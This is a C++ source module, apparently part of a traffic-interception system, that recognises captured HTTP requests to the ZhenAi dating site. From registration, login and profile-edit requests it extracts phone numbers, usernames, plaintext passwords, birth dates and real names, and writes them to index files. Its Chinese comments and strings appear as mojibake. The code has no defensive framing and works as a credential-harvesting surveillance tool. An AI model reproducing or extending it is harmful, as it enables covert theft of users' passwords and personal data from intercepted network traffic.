#include "StdAfx.h"
#include "MarriageZhenAi.h"

marriage::ZhenAiMarriage::ZhenAiMarriage(HttpSession *http_session, const string &pro_name) : Marriage(http_session,pro_name)
{
	app_ = "�䰮��";	
}

marriage::ZhenAiMarriage::~ZhenAiMarriage()
{
	
}

int marriage::ZhenAiMarriage::IsZhenAiMarriage(HttpSession *http_session)
{
	//��ҳע��
	if((http_session->m_Requestline.m_Host.Find("register.zhenai.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/register/reg55OnView.jsps")!=-1)) 
	{
		return kPcWebRegister;
	}
	//��ҳ��¼
	if((http_session->m_Requestline.m_Host.Find("profile.zhenai.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/login/loginactionindex")!=-1)) 
	{
		return kPcWebLogin;
	}
	//��ҳ�޸�����
	if((http_session->m_Requestline.m_Host.Find("profile.zhenai.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/v2/userdata/saveDetailInfo")!=-1)) 
	{
		return kPcWebModiy;
	}
	return 0;
}

int marriage::ZhenAiMarriage::Process(const char *packet,int action)
{
	//��ҳע��
	if (action == kPcWebRegister)
	{
		return PcWebRegister(packet);
	}
	//��ҳ��¼
	if (action == kPcWebLogin)
	{
		return PcWebLogin(packet);
	}
	//��ҳ�޸ĸ�������
	if (action == kPcWebModiy)
	{
		return PcWebModiy(packet);
	}
	return 1;
}
//pcע��
int marriage::ZhenAiMarriage::PcWebRegister(const char *packet)
{
	string src_data(packet);
	if (src_data.rfind("\r\n")!=string::npos)
	{
		src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	}
	ms_->SplitStringToMap(src_data,'&','=');
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	//�Ա�
	string sex = ms_->GetValueFromMapByKey("baseInfo.sex",true);
	if (sex == "0"){sex = "��";}
	else{sex = "Ů";}
	//��������
	string data = ms_->GetValueFromMapByKey("dateForm.year",true)+ "-" +
		ms_->GetValueFromMapByKey("dateForm.month",true) + "-" +
		ms_->GetValueFromMapByKey("dateForm.day",true);
	//�ֻ���
	string mobile = ms_->GetValueFromMapByKey("baseInfo2.servicemobile",true);
	//����
	string pwd = ms_->GetValueFromMapByKey("loginInfo.pwd",true);
	if (sex.empty() || data.empty() || mobile.empty() || pwd.empty())
	{
		return 0;
	}
	output_text_ =
		"oid=" + mobile + "\r\n" +           //�ֻ���
		"pass=" + pwd + "\r\n" +             //����
		"onick=" + data + "\r\n" +           //��������
		"sex=" +sex + "\r\n" +               //�Ա�
		"netmark=" + app_ + "\r\n" + 	     //��Դ
		"clientmsg=" + platformWeb + "\r\n" +//����ƽ̨
		"state=ע��\r\n";			         //״̬
	WriteIndexFile();
	return 1;
}

//web��¼
int marriage::ZhenAiMarriage::PcWebLogin(const char *packet)
{
	string src_data(packet);
	if (src_data.rfind("\r\n")!=string::npos)
	{
		src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	}
	ms_->SplitStringToMap(src_data,'&','=');
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	string username = ms_->GetValueFromMapByKey("loginInfo",true);
	string pwd = ms_->GetValueFromMapByKey("password",true);
	if (username.empty() || pwd.empty())
	{
		return 0;
	}
	output_text_ =
		"user=" + username + "\r\n" +          //�û���
		"pass=" + pwd + "\r\n" +               //����
		"netmark=" + app_ + "\r\n" + 		   //��Դ
		"clientmsg=" + platformWeb + "\r\n" +  //����ƽ̨
		"state=��¼\r\n";			           //״̬
	WriteIndexFile();
	return 1;
}

//��ϸ���ϸ�����Ϣ
int marriage::ZhenAiMarriage::PcWebModiy(const char *packet)
{
	string src_data(packet);
	if (src_data.rfind("\r\n")!=string::npos)
	{
		src_data = src_data.substr(src_data.rfind("\r\n") + strlen("\r\n"));
	}
	ms_->SplitStringToMap(src_data,'&','=');
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	string name = ms_->GetValueFromMapByKey("trueName",true);
	if (name.empty())
	{
		return 0;
	}
	output_text_ =
		"mid=" + name + "\r\n" +                //����
		"netmark=" + app_ + "\r\n" + 		    //��Դ
		"clientmsg=" + platformWeb + "\r\n" +   //����ƽ̨
		"state=�޸ĸ�����Ϣ\r\n";			    //״̬
	WriteIndexFile();
	return 1;
}

